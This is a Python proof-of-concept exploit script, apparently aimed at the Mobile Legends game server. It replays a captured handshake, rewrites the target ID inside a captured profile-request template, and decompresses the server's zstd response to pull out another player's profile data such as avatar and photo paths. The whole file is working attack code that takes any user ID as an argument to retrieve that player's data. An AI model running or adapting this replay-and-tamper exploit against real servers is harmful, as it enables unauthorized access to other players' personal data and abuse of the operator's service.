#!/usr/bin/env python3
"""
MLBB profile replay PoC (v1)
- Connects to the game server, replays a captured handshake,
  then sends a profile request and parses the zstd+protobuf response.
- Usage: python3 mlbb_replay_poc.py [target_id]
  (default target = 243221683, the ID from the capture)

Needs: replay_data.json in the same directory, python3-zstandard (pip install zstandard)
"""
import socket, struct, json, sys, time, re

def load_data():
    with open('replay_data.json') as f:
        return json.load(f)

def frame_msgs(blob):
    """Parse 1-byte type + 3-byte BE len (incl header) framing."""
    msgs = []
    off = 0
    while off + 4 <= len(blob):
        typ = blob[off]
        ln = struct.unpack('>I', b'\x00' + blob[off+1:off+4])[0]
        if ln < 4 or off + ln > len(blob):
            break
        msgs.append((typ, blob[off+4:off+ln]))
        off += ln
    return msgs

def encode_varint(n):
    out = b''
    while True:
        b = n & 0x7f
        n >>= 7
        out += bytes([b | (0x80 if n else 0)])
        if not n:
            break
    return out

def build_profile_request(target_id, template_hex):
    """Swap the target varint inside a captured profile-request template.
    Template body: 70 00 <seq> 01 <subseq> 45 <len> [70 00 <varint:id> 01 <varint> 80 80]
    """
    raw = bytes.fromhex(template_hex)
    body = bytearray(raw[4:])
    j45 = body.find(b'\x45')
    if j45 < 0:
        raise ValueError('template 0x45 marker not found')
    inner_start = j45 + 2
    old_inner_len = body[j45+1]
    assert body[inner_start:inner_start+2] == b'\x70\x00', 'inner magic mismatch'
    old_inner = body[inner_start:inner_start+old_inner_len]
    trailer = body[inner_start+old_inner_len:]  # e.g. trailing 0x80
    # old_inner = 70 00 <varint:id> 01 <varint> 80
    j = 2
    k = j
    while old_inner[k] & 0x80:  # skip old id varint
        k += 1
    k += 1
    new_inner = old_inner[:j] + encode_varint(target_id) + old_inner[k:]
    new_body = bytes(body[:j45]) + b'\x45' + bytes([len(new_inner)]) + new_inner + bytes(trailer)
    total = 4 + len(new_body)
    return bytes([0x00, (total >> 16) & 0xff, (total >> 8) & 0xff, total & 0xff]) + new_body

def recv_all(s, timeout=8):
    s.settimeout(timeout)
    data = b''
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

def main():
    data = load_data()
    target = int(sys.argv[1]) if len(sys.argv) > 1 else data['target_id']
    print(f"[+] target profile id: {target}")
    print(f"[+] connecting to {data['server']}:{data['port']} ...")
    s = socket.create_connection((data['server'], data['port']), timeout=10)
    print("[+] connected, replaying handshake (%d msgs) ..." % len(data['handshake']))
    for hx in data['handshake']:
        s.sendall(bytes.fromhex(hx))
        time.sleep(0.15)
    resp = recv_all(s, timeout=5)
    print(f"[+] handshake done, server sent {len(resp)} bytes back")
    if len(resp) == 0:
        print("[-] server sent nothing after handshake - session likely rejected/token expired")
        s.close()
        return

    req = build_profile_request(target, data['profile_request'])
    print(f"[+] sending profile request ({len(req)} bytes): {req.hex()}")
    s.sendall(req)
    resp = recv_all(s, timeout=10)
    print(f"[+] got {len(resp)} bytes in response")
    s.close()

    msgs = frame_msgs(resp)
    print(f"[+] parsed {len(msgs)} response messages")
    try:
        import zstandard
        dctx = zstandard.ZstdDecompressor()
    except ImportError:
        print("[-] pip install zstandard to decode responses")
        return
    found = False
    for typ, m in msgs:
        blob = m
        if typ == 0x10:
            try:
                blob = dctx.decompress(m, max_output_size=50_000_000)
            except Exception:
                continue
            # strict: real profile data = zstd msg with avatar/name content
            strs = re.findall(rb'[\x20-\x7e]{4,}', blob)
            interesting = [x for x in strs if any(k in x for k in
                           (b'dist/face', b'dist/photo'))]
            name_hit = re.search(rb'[A-Za-z][A-Za-z0-9_~]{2,20}', blob)
            if interesting:
                found = True
                print(f"    [+] type=0x{typ:02x} len={len(blob)} profile data!")
                for x in interesting[:6]:
                    print(f"        {x[:100]}")
    if not found:
        print("[-] no profile data in response.")
        print(f"    raw response ({len(resp)}B): {resp[:120].hex()}")
        print("    (ID may not exist, or server rejected the request)")
    else:
        print("[+] SUCCESS: profile data retrieved via replay!")

if __name__ == '__main__':
    main()
